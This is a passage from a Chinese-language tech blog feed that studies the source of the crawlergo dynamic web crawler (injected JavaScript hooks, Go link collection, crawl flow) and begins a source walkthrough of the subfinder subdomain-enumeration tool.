class="hljs-string">&quot;&gt; &quot;</span> + that.id + that.name + that.getAttribute(<span class="hljs-string">&quot;class&quot;</span>) + <span class="hljs-string">&quot;|&quot;</span> + event_name;<br><span class="hljs-comment">// console.log(name);</span><br><span class="hljs-comment">// 对每个事件设定最大的添加次数，防止无限触发，最大次数为5</span><br><span class="hljs-keyword">if</span> (!window.add_even_listener_count_sec_auto.hasOwnProperty(name)) &#123;<br>window.add_even_listener_count_sec_auto[name] = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (window.add_even_listener_count_sec_auto[name] == <span class="hljs-number">5</span>) &#123;<br><span class="hljs-keyword">return</span> ;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br> window.add_even_listener_count_sec_auto[name] += <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (that.hasAttribute(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>)) &#123;<br>let sec_auto_dom2_event_flag = that.getAttribute(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>);<br>that.setAttribute(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>, sec_auto_dom2_event_flag + <span class="hljs-string">&quot;|&quot;</span> + event_name);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>that.setAttribute(<span class="hljs-string">&quot;sec_auto_dom2_event_flag&quot;</span>, event_name);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// hook dom0 级事件监听</span><br>Object.defineProperties(HTMLElement.prototype, &#123;<br>onclick: &#123;set: function(newValue)&#123;onclick = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;click&quot;</span>);&#125;&#125;,<br>onchange: &#123;set: function(newValue)&#123;onchange = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;change&quot;</span>);&#125;&#125;,<br>onblur: &#123;set: function(newValue)&#123;onblur = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;blur&quot;</span>);&#125;&#125;,<br>ondblclick: &#123;set: function(newValue)&#123;ondblclick = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;dbclick&quot;</span>);&#125;&#125;,<br>onfocus: &#123;set: function(newValue)&#123;onfocus = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;focus&quot;</span>);&#125;&#125;,<br>onkeydown: &#123;set: function(newValue)&#123;onkeydown = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;keydown&quot;</span>);&#125;&#125;,<br>onkeypress: &#123;set: function(newValue)&#123;onkeypress = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;keypress&quot;</span>);&#125;&#125;,<br>onkeyup: &#123;set: function(newValue)&#123;onkeyup = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;keyup&quot;</span>);&#125;&#125;,<br>onload: &#123;set: function(newValue)&#123;onload = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;load&quot;</span>);&#125;&#125;,<br>onmousedown: &#123;set: function(newValue)&#123;onmousedown = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;mousedown&quot;</span>);&#125;&#125;,<br>onmousemove: &#123;set: function(newValue)&#123;onmousemove = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;mousemove&quot;</span>);&#125;&#125;,<br>onmouseout: &#123;set: function(newValue)&#123;onmouseout = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;mouseout&quot;</span>);&#125;&#125;,<br>onmouseover: &#123;set: function(newValue)&#123;onmouseover = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;mouseover&quot;</span>);&#125;&#125;,<br>onmouseup: &#123;set: function(newValue)&#123;onmouseup = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;mouseup&quot;</span>);&#125;&#125;,<br>onreset: &#123;set: function(newValue)&#123;onreset = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;reset&quot;</span>);&#125;&#125;,<br>onresize: &#123;set: function(newValue)&#123;onresize = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;resize&quot;</span>);&#125;&#125;,<br>onselect: &#123;set: function(newValue)&#123;onselect = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;select&quot;</span>);&#125;&#125;,<br>onsubmit: &#123;set: function(newValue)&#123;onsubmit = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;submit&quot;</span>);&#125;&#125;,<br>onunload: &#123;set: function(newValue)&#123;onunload = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;unload&quot;</span>);&#125;&#125;,<br>onabort: &#123;set: function(newValue)&#123;onabort = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;abort&quot;</span>);&#125;&#125;,<br>onerror: &#123;set: function(newValue)&#123;onerror = newValue;dom0_listener_hook(this, <span class="hljs-string">&quot;error&quot;</span>);&#125;&#125;,<br>&#125;)<br><br><span class="hljs-comment">// 监听 window.open 的 url</span><br>window.open = function (url) &#123;<br>console.log(<span class="hljs-string">&quot;trying to open window.&quot;</span>);<br>window.addLink(url, <span class="hljs-string">&quot;OpenWindow&quot;</span>);<br>&#125;<br>Object.defineProperty(window,<span class="hljs-string">&quot;open&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br><br><span class="hljs-comment">// hook window close 不真的关闭页面</span><br>window.<span class="hljs-built_in">close</span> = function() &#123;console.log(<span class="hljs-string">&quot;trying to close page.&quot;</span>);&#125;;<br>Object.defineProperty(window,<span class="hljs-string">&quot;close&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br><br><span class="hljs-comment">// hook setTimeout</span><br><span class="hljs-comment">//window.__originalSetTimeout = window.setTimeout;</span><br><span class="hljs-comment">//window.setTimeout = function() &#123;</span><br><span class="hljs-comment">//    arguments[1] = 0;</span><br><span class="hljs-comment">//    return window.__originalSetTimeout.apply(this, arguments);</span><br><span class="hljs-comment">//&#125;;</span><br><span class="hljs-comment">//Object.defineProperty(window,&quot;setTimeout&quot;,&#123;&quot;writable&quot;: false, &quot;configurable&quot;: false&#125;);</span><br><br><span class="hljs-comment">// hook setInterval 时间设置为60秒 目的是减 轻chrome 的压力</span><br>    <span class="hljs-comment">// 限制定时调用函数的的事件为 60 秒</span><br>window.__originalSetInterval = window.setInterval;<br>window.setInterval = function() &#123;<br>arguments[<span class="hljs-number">1</span>] = <span class="hljs-number">60000</span>;<br><span class="hljs-keyword">return</span> window.__originalSetInterval.apply(this, arguments);<br>&#125;;<br>Object.defineProperty(window,<span class="hljs-string">&quot;setInterval&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br><br><span class="hljs-comment">// 劫持原生ajax，并对每个请求设置最大请求次数</span><br>window.ajax_req_count_sec_auto = &#123;&#125;;<br>XMLHttpRequest.prototype.__originalOpen = XMLHttpRequest.prototype.open;<br>XMLHttpRequest.prototype.open = function(method, url, async, user, password) &#123;<br><span class="hljs-comment">// hook code</span><br>this.url = url;<br>this.method = method;<br>let name = method + url;<br><span class="hljs-keyword">if</span> (!window.ajax_req_count_sec_auto.hasOwnProperty(name)) &#123;<br>window.ajax_req_count_sec_auto[name] = <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>window.ajax_req_count_sec_auto[name] += <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (window.ajax_req_count_sec_auto[name] &lt;= <span class="hljs-number">10</span>) &#123;<br><span class="hljs-keyword">return</span> this.__originalOpen(method, url, <span class="hljs-literal">true</span>, user, password);<br>&#125;<br>&#125;<br>Object.defineProperty(XMLHttpRequest.prototype,<span class="hljs-string">&quot;open&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br><br>XMLHttpRequest.prototype.__originalSend = XMLHttpRequest.prototype.send;<br>XMLHttpRequest.prototype.send = function(data) &#123;<br><span class="hljs-comment">// hook code</span><br>let name = this.method + this.url;<br><span class="hljs-keyword">if</span> (window.ajax_req_count_sec_auto[name] &lt;= <span class="hljs-number">10</span>) &#123;<br><span class="hljs-keyword">return</span> this.__originalSend(data);<br>&#125;<br>&#125;<br>Object.defineProperty(XMLHttpRequest.prototype,<span class="hljs-string">&quot;send&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br><br>XMLHttpRequest.prototype.__originalAbort = XMLHttpRequest.prototype.abort;<br>XMLHttpRequest.prototype.abort = function() &#123;<br><span class="hljs-comment">// hook code</span><br>&#125;<br>Object.defineProperty(XMLHttpRequest.prototype,<span class="hljs-string">&quot;abort&quot;</span>,&#123;<span class="hljs-string">&quot;writable&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;configurable&quot;</span>: <span class="hljs-literal">false</span>&#125;);<br><br><span class="hljs-comment">// 打乱数组的方法</span><br>window.randArr = function (arr) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><span class="hljs-keyword">var</span> iRand = parseInt(arr.length * Math.random());<br><span class="hljs-keyword">var</span> temp = arr[i];<br>arr[i] = arr[iRand];<br>arr[iRand] = temp;<br>&#125;<br><span class="hljs-keyword">return</span> arr;<br>&#125;<br><span class="hljs-comment">// 延迟执行</span><br>window.sleep = function(time) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> Promise((resolve) =&gt; setTimeout(resolve, time));<br>&#125;<br><br>Array.prototype.indexOf = function(val) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; this.length; i++) &#123;<br><span class="hljs-keyword">if</span> (this[i] == val) <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;;<br><br>Array.prototype.remove = function(val) &#123;<br><span class="hljs-keyword">var</span> index = this.indexOf(val);<br><span class="hljs-keyword">if</span> (index &gt; <span class="hljs-number">-1</span>) &#123;<br>this.splice(index, <span class="hljs-number">1</span>);<br>&#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> binding = window[<span class="hljs-string">&quot;addLink&quot;</span>];<br>window[<span class="hljs-string">&quot;addLink&quot;</span>] = async(...args) =&gt; &#123;<br>        <span class="hljs-comment">// 从 addLink 中获取 callbacks 它是一个 Map()</span><br><span class="hljs-keyword">const</span> me = window[<span class="hljs-string">&quot;addLink&quot;</span>];<br>let callbacks = me[<span class="hljs-string">&#x27;callbacks&#x27;</span>];<br><span class="hljs-keyword">if</span> (!callbacks) &#123;<br>  callbacks = <span class="hljs-built_in">new</span> Map();<br>  me[<span class="hljs-string">&#x27;callbacks&#x27;</span>] = callbacks;<br>&#125;<br>        <span class="hljs-comment">// 当前序列号</span><br><span class="hljs-keyword">const</span> seq = (me[<span class="hljs-string">&#x27;lastSeq&#x27;</span>] || <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br>me[<span class="hljs-string">&#x27;lastSeq&#x27;</span>] = seq;<br><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">new</span> Promise(fulfill =&gt; callbacks.set(seq, fulfill));<br>binding(JSON.stringify(&#123;name: <span class="hljs-string">&quot;addLink&quot;</span>, seq, args&#125;));<br><span class="hljs-keyword">return</span> promise;<br>&#125;;<br><br><span class="hljs-keyword">const</span> bindingTest = window[<span class="hljs-string">&quot;Test&quot;</span>];<br>window[<span class="hljs-string">&quot;Test&quot;</span>] = async(...args) =&gt; &#123;<br><span class="hljs-keyword">const</span> me = window[<span class="hljs-string">&quot;Test&quot;</span>];<br>let callbacks = me[<span class="hljs-string">&#x27;callbacks&#x27;</span>];<br><span class="hljs-keyword">if</span> (!callbacks) &#123;<br>  callbacks = <span class="hljs-built_in">new</span> Map();<br>  me[<span class="hljs-string">&#x27;callbacks&#x27;</span>] = callbacks;<br>&#125;<br><span class="hljs-keyword">const</span> seq = (me[<span class="hljs-string">&#x27;lastSeq&#x27;</span>] || <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br>me[<span class="hljs-string">&#x27;lastSeq&#x27;</span>] = seq;<br><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">new</span> Promise(fulfill =&gt; callbacks.set(seq, fulfill));<br>binding(JSON.stringify(&#123;name: <span class="hljs-string">&quot;Test&quot;</span>, seq, args&#125;));<br><span class="hljs-keyword">return</span> promise;<br>&#125;;<br>&#125;)()<br></code></pre></td></tr></table></figure><p>之后是做了一个链接收集的操作，就是收集 src href data-url 属性值、 object[data] 、还有注释中的链接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> collectLinks() &#123;<br><span class="hljs-keyword">go</span> tab.collectHrefLinks()<br><span class="hljs-keyword">go</span> tab.collectObjectLinks()<br><span class="hljs-keyword">go</span> tab.collectCommentLinks()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> collectHrefLinks() &#123;<br><span class="hljs-keyword">defer</span> tab.collectLinkWG.Done()<br>ctx := tab.GetExecutor()<br><span class="hljs-comment">// 收集 src href data-url 属性值</span><br>attrNameList := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;src&quot;</span>, <span class="hljs-string">&quot;href&quot;</span>, <span class="hljs-string">&quot;data-url&quot;</span>, <span class="hljs-string">&quot;data-href&quot;</span>&#125;<br><span class="hljs-keyword">for</span> _, attrName := <span class="hljs-keyword">range</span> attrNameList &#123;<br>tCtx, cancel := context.WithTimeout(ctx, time.Second*<span class="hljs-number">1</span>)<br><span class="hljs-keyword">var</span> attrs []<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span><br>_ = chromedp.AttributesAll(fmt.Sprintf(<span class="hljs-string">`[%s]`</span>, attrName), &amp;attrs, chromedp.ByQueryAll).Do(tCtx)<br>cancel()<br><span class="hljs-keyword">for</span> _, attrMap := <span class="hljs-keyword">range</span> attrs &#123;<br>tab.AddResultUrl(config.GET, attrMap[attrName], config.FromDOM)<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> collectObjectLinks() &#123;<br><span class="hljs-keyword">defer</span> tab.collectLinkWG.Done()<br>ctx := tab.GetExecutor()<br><span class="hljs-comment">// 收集 object[data] links</span><br>tCtx, cancel := context.WithTimeout(ctx, time.Second*<span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> cancel()<br><span class="hljs-keyword">var</span> attrs []<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span><br>_ = chromedp.AttributesAll(<span class="hljs-string">`object[data]`</span>, &amp;attrs, chromedp.ByQueryAll).Do(tCtx)<br><span class="hljs-keyword">for</span> _, attrMap := <span class="hljs-keyword">range</span> attrs &#123;<br>tab.AddResultUrl(config.GET, attrMap[<span class="hljs-string">&quot;data&quot;</span>], config.FromDOM)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> collectCommentLinks() &#123;<br><span class="hljs-keyword">defer</span> tab.collectLinkWG.Done()<br>ctx := tab.GetExecutor()<br><span class="hljs-comment">// 收集注释中的链接</span><br><span class="hljs-keyword">var</span> nodes []*cdp.Node<br>tCtxComment, cancel := context.WithTimeout(ctx, time.Second*<span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> cancel()<br>commentErr := chromedp.Nodes(<span class="hljs-string">`//comment()`</span>, &amp;nodes, chromedp.BySearch).Do(tCtxComment)<br><span class="hljs-keyword">if</span> commentErr != <span class="hljs-literal">nil</span> &#123;<br>logger.Logger.Debug(<span class="hljs-string">&quot;get comment nodes err&quot;</span>)<br>logger.Logger.Debug(commentErr)<br><span class="hljs-keyword">return</span><br>&#125;<br>urlRegex := regexp.MustCompile(config.URLRegex)<br><span class="hljs-keyword">for</span> _, node := <span class="hljs-keyword">range</span> nodes &#123;<br>content := node.NodeValue<br>urlList := urlRegex.FindAllString(content, <span class="hljs-number">-1</span>)<br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> urlList &#123;<br>tab.AddResultUrl(config.GET, url, config.FromComment)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 Start() 完成之后，它会去把这些收集到的链接再去爬一遍：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go">tab.Start()<br><br><span class="hljs-comment">// 收集结果</span><br>t.crawlerTask.Result.resultLock.Lock()<br>t.crawlerTask.Result.AllReqList = <span class="hljs-built_in">append</span>(t.crawlerTask.Result.AllReqList, tab.ResultList...)<br>t.crawlerTask.Result.resultLock.Unlock()<br><span class="hljs-comment">// 遍历收集到的结构 添加任务</span><br><span class="hljs-keyword">for</span> _, req := <span class="hljs-keyword">range</span> tab.ResultList &#123;<br>    <span class="hljs-keyword">if</span> !t.crawlerTask.filter.DoFilter(req) &#123;<br>        t.crawlerTask.Result.resultLock.Lock()<br>        t.crawlerTask.Result.ReqList = <span class="hljs-built_in">append</span>(t.crawlerTask.Result.ReqList, req)<br>        t.crawlerTask.Result.resultLock.Unlock()<br>        <span class="hljs-keyword">if</span> !engine2.IsIgnoredByKeywordMatch(*req, t.crawlerTask.Config.IgnoreKeywords) &#123;<br>            t.crawlerTask.addTask2Pool(req)<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再总体简单理一下流程：</p><p>task.Run() </p><ol><li>initTasks url 收集<ol><li>robots.txt</li><li>Fuzz</li></ol></li><li>filter.DoFilter 去重</li><li>addTask2Pool 开始爬 &#x3D;&gt; task.Task()<ol><li>tab.Start() &#x3D;&gt; 爬行逻辑<ol><li>engine2.NewTab &#x3D;&gt; 初始化 Tab 和请求拦截监听<ol><li>响应处理 js、json、html 解析响应中的链接</li><li>基础认证页面注释处理</li><li>tab.AfterDOMRun()<ol><li>表单填充、提交</li><li>注入 ObserverJS 收集 src、href 属性值</li><li>触发事件</li></ol></li></ol></li><li>初始化 chromedp.Run<ol><li>runtime.AddBinding(“addLink”) &#x3D;&gt; 绑定函数，用于 go 和 js 进行交互去收集链接</li><li>注入 js.TabInitJS 浏览器属性、url 收集（ addLink ）</li></ol></li></ol></li><li>tab.ResultList 当前页面收集的链接去重再使用 addTask2Pool 去爬</li></ol></li><li>所有请求去重</li><li>从请求中收集域名数据</li></ol><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>学到的比较多，动态爬虫的具体实现、请求去重的方式、crawlergo 库深入使用、js 的一些知识，准备再看一看静态爬虫，看看它是如何去实现的。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>subfinder 源码学习</title>
      <link href="/2024/03/10/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/subfinder/"/>
      <url>/2024/03/10/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/subfinder/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>项目地址：<a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p>subfinder是一种子域发现工具，它使用被动在线资源返回网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。 专为只做一件事-被动子域枚举，它做得很好。</p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">├── passive<br>│   ├── passive.go# 被动收集的主要实现<br>│   ├── sources.go# 数据源初始化<br>├── resolve<br>│   ├── client.go# dns 相关的初始化<br>│   └── resolve.go# dns 解析域名, 收集泛解析的 hosts 黑名单, 去除存在泛解析的子域结果<br>├── runner<br>│   ├── banners.go<br>│   ├── config.go# api key 类数据源的配置文件 序列化 反序列化<br>│   ├── enumerate.go# 调用 passive.go 进行单个域名被动收集的实现<br>│   ├── initialize.go# 初始化 dns 和 数据源<br>│   ├── options.go# 参数解析<br>│   ├── outputter.go# 输出<br>│   ├── runner.go# 调用 enumerate.go 实现批量子域收集和结果的处理<br>│   ├── stats.go# 统计数据源及结果<br>│   ├── util.go<br>│   └── validate.go# 参数验证、正则处理、gologger 日志模式<br>├── subscraping<br>│   ├── agent.go# 封装 http 请求<br>│   ├── extractor.go# 正则处理、正则匹配获取子域名<br>│   ├── sources# 各种被动收集子域的数据源<br>│   ├── types.go# 数据源的接口<br>│   └── utils.go# api key 的处理<br></code></pre></td></tr></table></figure><h2 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h2><p>passive.go 就是 subfinder 进行被动收集的实现了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Agent)</span></span> EnumerateSubdomainsWithCtx(ctx context.Context, domain <span class="hljs-type">string</span>, proxy <span class="hljs-type">string</span>, rateLimit <span class="hljs-type">int</span>, timeout <span class="hljs-type">int</span>, maxEnumTime time.Duration, options ...EnumerateOption) <span class="hljs-keyword">chan</span> subscraping.Result &#123;<br>results := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> subscraping.Result)<br>    <span class="hljs-comment">// 使用协程去跑主要逻辑 然后直接返回 results 管道，通过管道的阻塞实现了控制，close(results) 没有被执行，那么遍历 results 就会一直阻塞，不会停止。 gofinger 使用的也是这种方式</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(results)<br><span class="hljs-keyword">var</span> enumerateOptions EnumerationOptions<br><span class="hljs-keyword">for</span> _, enumerateOption := <span class="hljs-keyword">range</span> options &#123;<br>enumerateOption(&amp;enumerateOptions)<br>&#125;<br><span class="hljs-comment">// 构建速率限制器</span><br>multiRateLimiter, err := a.buildMultiRateLimiter(ctx, rateLimit, enumerateOptions.customRateLimiter)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>results &lt;- subscraping.Result&#123;<br>Type: subscraping.Error, Error: fmt.Errorf(<span class="hljs-string">&quot;could not init multi rate limiter for %s: %s&quot;</span>, domain, err),<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br>        <span class="hljs-comment">// 创建一个 session 这个就是 agent.go 中封装的 http 请求模块</span><br>session, err := subscraping.NewSession(domain, proxy, multiRateLimiter, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>results &lt;- subscraping.Result&#123;<br>Type: subscraping.Error, Error: fmt.Errorf(<span class="hljs-string">&quot;could not init passive session for %s: %s&quot;</span>, domain, err),<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> session.Close()<br><span class="hljs-comment">// 带超时的上下文</span><br>ctx, cancel := context.WithTimeout(ctx, maxEnumTime)<br><br>wg := &amp;sync.WaitGroup&#123;&#125;<br><span class="hljs-comment">// Run each source in parallel on the target domain</span><br><span class="hljs-keyword">for</span> _, runner := <span class="hljs-keyword">range</span> a.sources &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-comment">// 调用每个数据源的 Run 方法 WithValue =&gt; 携带数据的上下文 这里携带的是 key =&gt; source value =&gt; 数据源名称</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(source subscraping.Source)</span></span> &#123;<br>                <span class="hljs-comment">// 这是使用 WithValue 的上下文携带数据源的名称 </span><br>ctxWithValue := context.WithValue(ctx, subscraping.CtxSourceArg, source.Name())<br>                <span class="hljs-comment">// 这里也是实现的阻塞 Run 里面的 chan 不关闭这里就一直会遍历</span><br><span class="hljs-keyword">for</span> resp := <span class="hljs-keyword">range</span> source.Run(ctxWithValue, domain, session) &#123;<br>results &lt;- resp<br>&#125;<br>wg.Done()<br>&#125;(runner)<br>&#125;<br>wg.Wait()<br>cancel()<br>&#125;()<br><span class="hljs-keyword">return</span> results<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看下数据源的 Run 方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Source)</span></span> Run(ctx context.Context, domain <span class="hljs-type">string</span>, session *subscraping.Session) &lt;-<span class="hljs-keyword">chan</span> subscraping.Result &#123;<br>results := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> 